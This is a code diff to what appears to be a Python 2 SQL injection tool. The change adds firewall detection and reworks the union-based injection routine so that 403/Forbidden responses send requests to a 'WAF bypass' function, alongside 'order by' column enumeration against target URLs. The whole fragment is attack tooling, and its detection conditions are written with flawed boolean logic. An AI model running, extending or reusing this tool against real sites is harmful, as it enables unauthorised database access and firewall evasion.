@@ -43,6 +43,16 @@ def comp(a,b):
     else:
         print("[-] Not Vulnerable")
 
+def checkwaf(temp):
+    print "[+] Checking for waf bypass"
+    if "Forbidden" and "403" in temp:
+        return True
+    else:
+        return False
+
+
+
+
 def sqlorder(temp):
     global count
     cl=" order by "
@@ -143,18 +153,26 @@ def splitter2(temp):
 
 def union(str):
     global count2,totals
-    if count2>=1:
+    if count2==1:
         totals=str
+    else:
+        pass
 
     r=requests.get(str, verify=False)
     ss[:] = []
     a=""
     a=r.text
     if count2<1:
-        if "403" or "Forbidden" in a:
+        check=checkwaf(a)
+        if check is True:
+            print a
             count2+=1
             print("[!] Bypassing union waf")
             bypass2(str)
+        else:
+            pass
+    else:
+        pass
 
     for aas in dict.keys():
         if aas in a:
